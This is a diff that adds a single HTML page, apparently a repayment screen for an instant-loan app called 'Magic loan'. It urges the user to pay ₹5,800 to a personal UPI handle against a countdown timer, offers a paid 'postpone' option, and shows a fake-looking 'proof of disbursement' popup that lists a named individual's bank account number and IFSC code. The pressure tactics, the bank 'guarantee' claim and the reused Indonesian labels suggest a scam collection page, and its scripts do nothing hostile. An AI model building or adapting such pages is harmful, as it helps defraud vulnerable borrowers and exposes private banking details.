@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loan Repayment App</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      margin: 0;
+      padding: 0;
+    }
+    .page {
+      display: none;
+      max-width: 500px;
+      margin: 20px auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+    .active { display: block; }
+    .title { font-size: 22px; font-weight: bold; margin-bottom: 10px; }
+    .money { font-size: 28px; color: #0981f4; margin-bottom: 5px; }
+    .date, .overdue { font-size: 14px; margin-bottom: 5px; }
+    .tip-text {
+      background: #f1f8ff; padding: 10px; border-radius: 8px;
+      margin: 10px 0; font-size: 14px;
+    }
+    .info { border-top: 1px solid #ddd; padding-top: 10px; margin-top: 10px; }
+    .horizontal-box {
+      display: flex; justify-content: space-between; padding: 6px 0;
+    }
+    .label { font-weight: bold; }
+    .btn-box { margin-top: 20px; }
+    .btn {
+      display: block; text-align: center; padding: 12px;
+      margin: 8px 0; border-radius: 8px; cursor: pointer; font-weight: bold;
+    }
+    .btn-primary { background: #0981f4; color: #fff; }
+    .btn-outline { border: 1px solid #0981f4; color: #0981f4; background: #fff; }
+    .tips { font-size: 12px; color: #555; margin-top: 8px; }
+
+    /* Payment page */
+    .timer { font-size: 18px; font-weight: bold; color: #d9534f; margin-bottom: 20px; }
+    .section { margin-bottom: 20px; }
+    .value { font-size: 16px; margin-bottom: 10px; }
+    .copy-btn {
+      display: inline-block; margin-top: 5px; padding: 6px 12px;
+      background: #0981f4; color: #fff; border: none; border-radius: 6px;
+      cursor: pointer; font-size: 14px;
+    }
+    .notice {
+      background: #fff8e1; padding: 10px; border-radius: 8px;
+      font-size: 14px; margin-bottom: 20px;
+    }
+    .input-box { margin: 15px 0; }
+    input {
+      width: 100%; padding: 10px; font-size: 14px;
+      border-radius: 6px; border: 1px solid #ccc; margin-top: 5px;
+    }
+    .submit-btn {
+      width: 100%; padding: 12px; background: #28a745;
+      color: #fff; border: none; border-radius: 8px;
+      font-size: 16px; cursor: pointer;
+    }
+    .footer { margin-top: 20px; font-size: 13px; color: #555; text-align: center; }
+
+    /* Popup modal */
+    .modal {
+      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.5); justify-content: center; align-items: center;
+    }
+    .modal-content {
+      background: #fff; padding: 20px; border-radius: 10px;
+      width: 90%; max-width: 400px; position: relative;
+    }
+    .modal-title {
+      font-size: 18px; font-weight: bold; margin-bottom: 15px;
+      text-align: center; color: #0981f4;
+    }
+    .close-btn {
+      position: absolute; top: 10px; right: 15px;
+      font-size: 20px; font-weight: bold; color: #555; cursor: pointer;
+    }
+    .modal-info { margin: 8px 0; font-size: 14px; }
+    .modal-info .label { font-weight: bold; }
+  </style>
+</head>
+<body>
+  <!-- Repay Page -->
+  <div id="repayPage" class="page active">
+    <div class="title">Repay Amount</div>
+    <div class="money">₹ 5,800</div>
+    <div class="date">Payment dates: 2025-09-01</div>
+    <div class="overdue">Due in 1 day</div>
+
+    <div class="tip-text">
+      You can borrow <b>₹ 5,800</b> next time after repayment on time
+    </div>
+
+    <div class="info">
+      <div class="horizontal-box"><div class="label">Lending institutions</div><div>Magic loan</div></div>
+      <div class="horizontal-box"><div class="label">Application Amount</div><div>₹ 5,800.00</div></div>
+      <div class="horizontal-box"><div class="label">Expire Date</div><div>2025-09-01</div></div>
+      <div class="horizontal-box">
+        <div class="label">Transfer receipt</div>
+        <div style="color:#0981f4; cursor:pointer;" onclick="openModal()">Check</div>
+      </div>
+      <div class="horizontal-box"><div class="label">Bill has been settled</div><div>Fill in the UTR</div></div>
+    </div>
+
+    <div class="tip-text">
+      <b>Repayment Instructions</b><br>
+      1. The repayment link is valid for <b>10 minutes</b>. Late transfers may fail.<br>
+      2. Make sure the transfer amount matches the repayment amount.<br>
+      3. Each order has a unique repayment UPI. <b>Do not reuse it.</b>
+    </div>
+
+    <div class="btn-box">
+      <div class="btn btn-primary" onclick="goToPayment()">Pay in full to unlock ₹ 5,800</div>
+      <div class="btn btn-outline" onclick="alert('Postponed!')">Pay ₹ 2,340 to postpone the payment</div>
+      <div class="tips">After completing the payment, refresh this link to check if your loan has been settled.</div>
+    </div>
+  </div>
+
+  <!-- Payment Page -->
+  <div id="paymentPage" class="page">
+    <div class="timer">Order will be closed in: 2 : 33</div>
+    <div class="section">
+      <span class="label">Amount</span>
+      <div class="value">₹ 5,800</div>
+      <button class="copy-btn" onclick="copyText('5800')">COPY</button>
+    </div>
+    <div class="section">
+      <span class="label">VPA/UPI</span>
+      <div class="value">Miah******12@axl</div>
+      <button class="copy-btn" onclick="copyText('Miahpayment12@axl')">COPY</button>
+    </div>
+    <div class="notice">
+      <b>Notice:</b><br>
+      1. One UPI can only transfer money once.<br>
+      2. Don't change the payment amount. Otherwise, the order cannot be closed.
+    </div>
+    <div class="section">
+      <span class="label">Fill the UTR numbers after you done payment</span>
+      <div class="input-box">
+        <label for="utr">UTR</label>
+        <input type="text" id="utr" placeholder="Input UTR number (12 digits)" maxlength="12">
+      </div>
+      <button class="submit-btn" onclick="submitUTR()">Submit UTR</button>
+    </div>
+    <div class="footer">
+      Dear customers: Please give priority to this channel to recharge!<br>
+      Support UPI account withdrawal! ICICI Bank guarantee! Safe and reliable!
+    </div>
+  </div>
+
+  <!-- Popup Modal -->
+  <div id="modal" class="modal">
+    <div class="modal-content">
+      <span class="close-btn" onclick="closeModal()">&times;</span>
+      <div class="modal-title">Proof of disbursement of funds</div>
+      <div class="modal-info"><span class="label">Transaction Amount:</span> ₹ 3,000</div>
+      <div class="modal-info"><span class="label">Description:</span> payment</div>
+      <div class="modal-info"><span class="label">Date Created:</span> 2025-08-26 01:44</div>
+      <div class="modal-info"><span class="label">User Name:</span> N MANJUNATH</div>
+      <div class="modal-info"><span class="label">Nomor rekening:</span> 35193222218</div>
+      <div class="modal-info"><span class="label">Kode Bank:</span> SBIN0012725</div>
+    </div>
+  </div>
+
+  <script>
+    function goToPayment() {
+      document.getElementById('repayPage').classList.remove('active');
+      document.getElementById('paymentPage').classList.add('active');
+    }
+    function copyText(text) {
+      navigator.clipboard.writeText(text).then(() => {
+        alert(text + ' copied to clipboard');
+      });
+    }
+    function submitUTR() {
+      const utr = document.getElementById('utr').value;
+      if(utr.length === 12 && /^[0-9]+$/.test(utr)) {
+        alert('UTR submitted: ' + utr);
+      } else {
+        alert('Please enter a valid 12-digit UTR number');
+      }
+    }
+    function openModal() {
+      document.getElementById('modal').style.display = 'flex';
+    }
+    function closeModal() {
+      document.getElementById('modal').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
